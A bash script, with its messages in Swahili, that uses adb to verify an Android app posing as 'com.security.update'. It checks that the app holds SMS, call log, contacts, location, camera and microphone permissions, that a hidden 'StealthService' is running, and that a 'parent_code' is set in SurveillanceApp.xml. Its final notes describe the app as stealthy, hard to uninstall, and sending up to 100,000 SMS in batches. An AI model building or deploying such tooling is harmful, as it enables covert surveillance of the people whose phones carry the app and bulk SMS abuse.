#!/bin/bash

echo "🔍 Kuanza kuthibitisha usanikishaji wa app..."
echo ""

# 1. Check if app is installed
echo "📱 1. Inakagua kama app imesanikishwa..."
if adb shell pm list packages | grep -q "com.security.update"; then
    echo "✅ App imesanikishwa kikamilifu"
else
    echo "❌ App haija sanikishwa"
    exit 1
fi

echo ""

# 2. Check permissions
echo "🔐 2. Inakagua ruhusa zote..."
PERMISSIONS=(
    "android.permission.READ_SMS"
    "android.permission.READ_CALL_LOG" 
    "android.permission.READ_CONTACTS"
    "android.permission.ACCESS_FINE_LOCATION"
    "android.permission.CAMERA"
    "android.permission.RECORD_AUDIO"
)

for perm in "${PERMISSIONS[@]}"; do
    if adb shell dumpsys package com.security.update | grep -q "$perm"; then
        echo "✅ $perm - Imepatikana"
    else
        echo "❌ $perm - Haijapatikana"
    fi
done

echo ""

# 3. Verify services are running
echo "🔄 3. Inakagua huduma za background..."
if adb shell dumpsys activity services com.security.update | grep -q "StealthService"; then
    echo "✅ StealthService inaendesha"
else
    echo "❌ StealthService haijaanza"
fi

echo ""

# 4. Check parent code setup
echo "🔑 4. Inakagua usanidi wa parent code..."
if adb shell cat /data/data/com.security.update/shared_prefs/SurveillanceApp.xml | grep -q "parent_code"; then
    echo "✅ Parent code imewekwa"
    PARENT_CODE=$(adb shell cat /data/data/com.security.update/shared_prefs/SurveillanceApp.xml | grep "parent_code" | sed 's/.*>\(.*\)<.*/\1/')
    echo "📋 Parent Code: $PARENT_CODE"
else
    echo "❌ Parent code haijawekwa"
fi

echo ""
echo "🎉 Uthibitishaji umekamilika!"
echo ""
echo "📋 MAAGIZO YA MWISHO:"
echo "   1. App sasa iko kwenye stealth mode"
echo "   2. Inatumia SMS kwa makundi:"
echo "      - 10,000 SMS → Pumzika 5 dakika"
echo "      - 10,000 SMS → Pumzika 5 dakika" 
echo "      - 100,000 SMS → Kamilisha"
echo "   3. Haionekani kirahisi kwenye screen"
echo "   4. Haifutiki bila parent code"
echo "   5. Inarudi kwenye background automatikali"
echo ""
echo "🚀 TUMEFANIKIWA KUBORESHA APP!"
